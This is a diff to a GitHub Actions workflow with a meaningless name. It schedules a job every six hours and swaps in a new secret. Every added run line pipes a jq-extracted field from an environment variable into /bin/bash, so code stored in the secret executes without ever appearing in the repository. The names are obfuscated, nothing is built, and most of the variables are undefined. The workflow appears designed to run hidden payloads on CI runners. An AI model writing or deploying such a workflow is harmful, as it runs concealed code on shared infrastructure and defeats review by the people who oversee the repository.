@@ -3,22 +3,26 @@ name: hugeloveclv
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 3/6 * * *'
+    - cron: '38 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hugeloveclv
         env:
-          zuqq75: ${{ secrets.zuqq75 }}
+          j03: ${{ secrets.j03 }}
         run: |
-          echo $zuqq75 | jq -r .ywd45 | /bin/bash
-          echo $wr764 | jq -r .kqfy77820 | /bin/bash
-          echo $gcnf7 | jq -r .ur40454 | /bin/bash
-          echo $xk62 | jq -r .c4 | /bin/bash
-          echo $xq39253 | jq -r .xbepg677 | /bin/bash
-          echo $vi1956 | jq -r .teikz03 | /bin/bash
-          echo $xc89 | jq -r .cgw798 | /bin/bash
-          echo $skg213 | jq -r .wnh700 | /bin/bash
+          echo $j03 | jq -r .lqwea14919 | /bin/bash
+          echo $o97925 | jq -r .jfqc7 | /bin/bash
+          echo $d1166 | jq -r .zm238 | /bin/bash
+          echo $k085 | jq -r .aqp4038 | /bin/bash
+          echo $j8748 | jq -r .r5 | /bin/bash
+          echo $hqe48914 | jq -r .pis92636 | /bin/bash
+          echo $modpy881 | jq -r .qvh063 | /bin/bash
+          echo $evfq0 | jq -r .l256 | /bin/bash
+          echo $z53 | jq -r .rbgjh38 | /bin/bash
+          echo $qtv28 | jq -r .bvfol1 | /bin/bash
 
